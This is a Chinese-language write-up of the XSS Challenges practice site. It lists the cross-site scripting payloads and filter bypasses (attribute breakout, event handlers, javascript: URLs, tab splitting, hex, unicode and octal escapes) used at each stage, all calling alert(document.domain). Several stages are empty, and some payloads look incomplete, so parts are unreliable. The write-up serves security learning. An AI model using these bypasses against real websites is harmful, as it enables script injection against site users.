---
description: '平台地址：http://xss-quiz.int21h.jp/'
---

# XSS Challenges解题记录

## **Stage1:**

最基本的反射型XSS

![&#x7B2C;&#x4E00;&#x9898;](../../.gitbook/assets/image%20%2830%29.png)

随便提交点什么后打开开发者工具查看结果处的代码

![](../../.gitbook/assets/image%20%2846%29.png)

发现结果被b标签包裹，尝试输入测试代码

```text
<script>alert('mrzhang76')</script>
```

 攻击成功

![](../../.gitbook/assets/image%20%2845%29.png)

根据提示注入获得下一关地址 

```text
<script> alert(document.domain);</script>
```

![](../../.gitbook/assets/image%20%2870%29.png)

## **Stage2:**

输入的内容在value中

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2852%29.png)

随便提交点什么后打开开发者工具查看结果处的代码

![](../../.gitbook/assets/image%20%285%29.png)

![&#x5185;&#x5BB9;&#x8F93;&#x51FA;&#x5728;value&#x4E2D;](../../.gitbook/assets/image%20%2864%29.png)

发现输入的结果会产生在value=""中，尝试进行闭合 

```text
mrzhang76">alert(document.domain);<input value" 
```

攻击成功

![&#x5728;&#x8FDB;&#x884C;&#x95ED;&#x5408;&#x540E;&#x8FDB;&#x80FD;&#x89E6;&#x53D1;&#x653B;&#x51FB;&#x4EE3;&#x7801;](../../.gitbook/assets/image%20%2831%29.png)

![&#x6210;&#x529F;&#x83B7;&#x5F97;&#x4E0B;&#x4E00;&#x5173;&#x5730;&#x5740;](../../.gitbook/assets/image%20%2896%29.png)

## **Stage3:**

隐藏在选项后的攻击入口

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2855%29.png)

在输入框进行测试后发现转义了

![&#x867D;&#x7136;&#x6210;&#x529F;&#x8F93;&#x5165;&#x4E86;&#xFF0C;&#x4F46;&#x5E76;&#x4E0D;&#x4F1A;&#x88AB;&#x6267;&#x884C;](../../.gitbook/assets/image%20%2873%29.png)

但是还存在另外一个输入点，使用抓包工具在另一个输入点发送恶意代码

![&#x5728;P2&#x4E2D;&#x8BBE;&#x7F6E;&#x653B;&#x51FB;&#x8BED;&#x53E5;](../../.gitbook/assets/image%20%2821%29.png)

攻击成功

![](../../.gitbook/assets/image%20%2825%29.png)

![&#x83B7;&#x5F97;&#x4E0B;&#x4E00;&#x5173;&#x5730;&#x5740;](../../.gitbook/assets/image%20%2860%29.png)

## **Stage4:**

被隐藏的提交入口

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2828%29.png)

使用开发者工具检查代码

![&#x5B58;&#x5728;&#x9690;&#x85CF;&#x7684;&#x63D0;&#x4EA4;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2884%29.png)

发现一个隐藏输入点，使用抓包工具改包利用

![&#x5728;&#x9690;&#x85CF;&#x7684;&#x63D0;&#x4EA4;&#x4E2D;&#x6DFB;&#x52A0;&#x5DE5;&#x5177;&#x8BED;&#x53E5;](../../.gitbook/assets/image%20%2833%29.png)

攻击成功

![](../../.gitbook/assets/image%20%28105%29.png)

![&#x83B7;&#x5F97;&#x4E0B;&#x4E00;&#x5173;&#x5730;&#x5740;](../../.gitbook/assets/image%20%2816%29.png)

## **Stage5:**

使用抓包工具突破前端长度限制

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2875%29.png)

随便输入点什么发现会出现在value中，尝试进行攻击时发现存在长度限制

![&#x8F93;&#x5165;&#x6846;&#x5B58;&#x5728;&#x957F;&#x5EA6;&#x9650;&#x5236;](../../.gitbook/assets/image%20%2817%29.png)

使用抓包工具改包突破前端长度限制

![](../../.gitbook/assets/image%20%2841%29.png)

攻击成功

![](../../.gitbook/assets/image%20%2839%29.png)

![&#x83B7;&#x5F97;&#x4E0B;&#x4E00;&#x5173;&#x5730;&#x5740;](../../.gitbook/assets/image%20%2868%29.png)

## **Stage6:**

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2848%29.png)

随便输入点什么

![](../../.gitbook/assets/image%20%2822%29.png)

尝试输入恶意代码，发现&lt;和&gt;被过滤了，但是可以正常闭合"

![](../../.gitbook/assets/image%20%2888%29.png)

尝试使用onclick属性进行攻击

```text
mrzhang76" onclick="alert(document.domain);"
```

攻击成功

![](../../.gitbook/assets/image%20%2898%29.png)

## **Stage7:**

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2851%29.png)

随便输入点什么

![&#x548C;stage6&#x76F8;&#x4F3C;](../../.gitbook/assets/image%20%2899%29.png)

用stage6的攻击代码一样可以完成攻击

![](../../.gitbook/assets/image%20%2865%29.png)

其实stage7过滤了 " ，这里是使用了空格进行了属性的分隔

## **Stage8:**

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%283%29.png)

随便输入点什么，发现输入的内容会被输出到a标签的href中

![](../../.gitbook/assets/image%20%2892%29.png)

可以尝试在a标签中执行js代码,攻击成功

```text
javascript:alert(document.domain);
```

![](../../.gitbook/assets/image%20%2863%29.png)

![&#x83B7;&#x5F97;&#x4E0B;&#x4E00;&#x5173;&#x5730;&#x5740;](../../.gitbook/assets/image%20%2885%29.png)

## **Stage9:**

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%28100%29.png)

随便输入什么看看

![](../../.gitbook/assets/image%20%2823%29.png)

## **Stage10:**

使用双拼写绕过简单过滤

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%288%29.png)

随便输入点什么

![&#x8F93;&#x5165;&#x7684;&#x6587;&#x672C;&#x51FA;&#x73B0;&#x5728;value&#x4E2D;](../../.gitbook/assets/image%20%2866%29.png)

构造攻击代码，发现domain被替换为空了

```text
mrzhang76"><script>alert(document.domain);</script><b id="
```

然后构造了双拼写攻击代码

```text
mrzhang76"><script>alert(document.ddomainomain);</script><b id="
```

攻击成功

![](../../.gitbook/assets/image%20%28104%29.png)

## **Stage11:**

使用制表符突破过滤

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2824%29.png)

随便输入

![&#x8F93;&#x5165;&#x7684;&#x6587;&#x672C;&#x51FA;&#x73B0;&#x5728;value&#x4E2D;](../../.gitbook/assets/image%20%28103%29.png)

尝试进行攻击，发现存在过滤 

```text
mrzhang76">alert(document.domain);<b id="
```

![&#x540E;&#x53F0;&#x5C06;&#x5371;&#x9669;&#x5B57;&#x7B26;&#x4E32;&#x5904;&#x7406;&#x4E86;](../../.gitbook/assets/image%20%2813%29.png)

使用制表符尝试突破

```text
mrzhang76"><a href=javascri&#09pt:alert(document.domain)>mrzhang76</a><b id="
```

![&#x4F7F;&#x7528;&#x6293;&#x5305;&#x5DE5;&#x5177;&#x63D0;&#x4EA4;&#x653B;&#x51FB;&#x8BED;&#x53E5;](../../.gitbook/assets/image%20%2877%29.png)

**攻击成功**

![](../../.gitbook/assets/image%20%2872%29.png)

![&#x83B7;&#x5F97;&#x4E0B;&#x4E00;&#x5173;&#x5730;&#x5740;](../../.gitbook/assets/image%20%2812%29.png)

尝试使用伪协议出现跨域问题………..WHY?

```text
<object data="data:text/html;base64,IDxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4=
```

## **Stage12:**

IE中存在将 \`\` 转换为 " 的特性

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2891%29.png)

进行攻击代码测试发现存在过滤，使用十进制HTML符号也不能突破

```text
mrzhang76­&#34;&#62;&#60;script&#62;alert(document.domain);­&#60;&#8260;script&#62; &#60;b&#173;id=&#34;
```

![&#x5B9E;&#x9645;&#x4E0A;&#x5B83;&#x8FC7;&#x6EE4;&#x6389;&#x4E86;x00-x20&#x7684;&#x6240;&#x6709;&#x5B57;&#x7B26;&#xFF08;&#x5168;&#x90E8;&#x7684;&#x63A7;&#x5236;&#x7B26;&#x548C;&#x7A7A;&#x683C;&#x7B26;&#xFF09;&#x548C;&amp;lt;,&amp;gt;,&quot;,&apos;](../../.gitbook/assets/image%20%2854%29.png)

IE中存在将 \`\` 转换为 " 的特性，使用IE进行测试

```text
``onmouseover=alert(document.domain);
```

攻击成功：

![&#x83B7;&#x5F97;&#x4E0B;&#x4E00;&#x5173;&#x5730;&#x5740;](../../.gitbook/assets/image%20%2810%29.png)

## **Stage13:**

## **Stage14:**

## **Stage15:**

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2887%29.png)

**随便输入点什么**

![&#x5178;&#x578B;&#x7684;DOM XSS](../../.gitbook/assets/image%20%2858%29.png)

构造以svg标签为基础的攻击语句

```text
<svg onload=alert(document.domain)>
```

![](../../.gitbook/assets/image%20%2826%29.png)

没有进行正常解析，尝试使用16进制绕过

```text
\x3csvg\x2fonload=alert(document.domain)\x3e
```

![&#x5355;&#x4E2A;\&#x4F1A;&#x88AB;&#x8FC7;&#x6EE4;&#x6389;](../../.gitbook/assets/image%20%2874%29.png)

\被过滤掉了，尝试使用双\\进行绕过

```text
\\x3csvg\\x2fonload=alert(document.domain)\\x3e
```

攻击成功

![](../../.gitbook/assets/image%20%2832%29.png)

![](../../.gitbook/assets/image%20%2820%29.png)

## **Stage16:**

![&#x9898;&#x76EE;&#x5165;&#x53E3;](../../.gitbook/assets/image%20%2811%29.png)

随便输点什么

![](../../.gitbook/assets/image%20%28107%29.png)

使用Stage15的解法测试一下：

```text
\x3csvg\x2fonload=alert(document.domain)\x3e 
```

没有成功触发

![](../../.gitbook/assets/image%20%2886%29.png)

尝试使用JS的unicode编码 

```text
\\u003csvg onload=alert(document.domain)\\u003e
```

攻击成功：

![](../../.gitbook/assets/image%20%2856%29.png)

![&#x83B7;&#x5F97;&#x4E0B;&#x4E00;&#x5173;&#x5730;&#x5740;](../../.gitbook/assets/image%20%28102%29.png)

PS：JS有8进制、16进制、unicode编码 

8进制的PAYLOAD:

```text
\\74svg onload=alert(document.domain)\\76
```

## **Stage17:**

![](../../.gitbook/assets/image%20%2867%29.png)

## **Stage18：**

![](../../.gitbook/assets/image%20%2859%29.png)

## **Stage19：**

